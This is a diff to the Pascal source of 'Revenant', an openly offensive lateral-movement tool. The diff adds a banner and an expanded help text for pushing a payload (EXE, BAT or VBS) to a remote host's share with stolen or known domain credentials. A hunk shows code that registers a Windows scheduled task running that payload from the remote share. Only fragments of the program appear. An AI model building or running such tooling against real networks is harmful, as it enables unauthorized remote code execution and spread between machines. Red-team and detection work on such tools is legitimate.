@@ -1,3 +1,39 @@
+{
+
+
+ _______  _______           _______  _        _______  _       _________
+(  ____ )(  ____ \|\     /|(  ____ \( (    /|(  ___  )( (    /|\__   __/
+| (    )|| (    \/| )   ( || (    \/|  \  ( || (   ) ||  \  ( |   ) (
+| (____)|| (__    | |   | || (__    |   \ | || (___) ||   \ | |   | |
+|     __)|  __)   ( (   ) )|  __)   | (\ \) ||  ___  || (\ \) |   | |
+| (\ (   | (       \ \_/ / | (      | | \   || (   ) || | \   |   | |
+| ) \ \__| (____/\  \   /  | (____/\| )  \  || )   ( || )  \  |   | |
+|/   \__/(_______/   \_/   (_______/|/    )_)|/     \||/    )_)   )_(
+
+
+
+* Source is provided to this software because we believe users have a     *
+* right to know exactly what a program is going to do before they run it. *
+* This also allows you to audit the software for security holes.          *
+*                                                                         *
+* Source code also allows you to port Revenant to new platforms, fix bugs *
+* and add new features.
+* 0xsp Revenant will always be available Open Source.                  *
+*                                                                         *
+*                                                                         *
+*  This program is distributed in the hope that it will be useful,        *
+*  but WITHOUT ANY WARRANTY; without even the implied warranty of         *
+*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                   *
+*                                                                         *
+*  #Author : Lawrence Amer   @zux0x3a                                     *
+*  #LINKS :  https://0xsp.com                                             *
+*                                                                         *
+
+
+
+}
+
+
 program project1;
 
 {$mode objfpc}{$H+}
@@ -355,7 +391,7 @@ begin
   trigger.Enabled:=true;
   action_:=taskdefinition.Actions.Create(0);
   IExecAction(action_).Path:='\\'+u_host+'\'+s_share+'\'+payload;    //here should be path of mounted driver
- // IExecAction(action_).Path:='c:\payload.exe';
+
  rootfolder.RegisterTaskDefinition('Test Task',
          taskdefinition,TASK_CREATE_OR_UPDATE,NULL,NULL , TASK_LOGON_INTERACTIVE_TOKEN,NULL);
 end;
@@ -409,7 +445,7 @@ end;
 procedure TRevenant.banner;
 
   var
-  asci,author,site:string;
+  asci,author,site,slog:string;
 
 begin
 
@@ -422,9 +458,11 @@ begin
 
   author := '[!] Lawrence Amer @zux0x3a';
   site :=   '[!] https://0xsp.com';
+  slog :=   '[^] Move East-West .. < Revenant ';
   writeln(asci);
   writeln(author);
   writeln(site);
+  writeln(slog);
 
 end;
 
@@ -505,8 +543,16 @@ procedure TRevenant.WriteHelp;
 
 begin
   { add your help code here }
-  writeln('Automatic: ', ExeName, ' -h host -u test -p "admini" -d "0xsp" -s share -c payload.[EXE,BAT,VBS]');
   writeln('');
+  writeln('-h',' --remote hostname or IP Address.');
+  writeln('-u',' --valid username for authentication');
+  writeln('-p',' --valid account password ');
+  writeln('-d',' --specify Domain name FQDN');
+  writeln('-s',' --share folder or driver e.g c,d,admin,user,uploads..etc');
+  writeln('-c',' --select local payload as executable format or script to upload into target host');
+  writeln('-t',' --[OPTIONAL] use this option in order to run the payload at specific date and time');
+  writeln('Example: ', ExeName, ' -h host -u test -p "admini" -d "0xsp" -s share -c payload.[EXE,BAT,VBS]');
+  writeln(' ');
   writeln('Manual Task: ', ExeName, ' -h host -u test -p "admini" -d "0xsp" -s share -c payload.[EXE,BAT,VBS] -t (2020\09\11 13:00:00)');
 
 end;
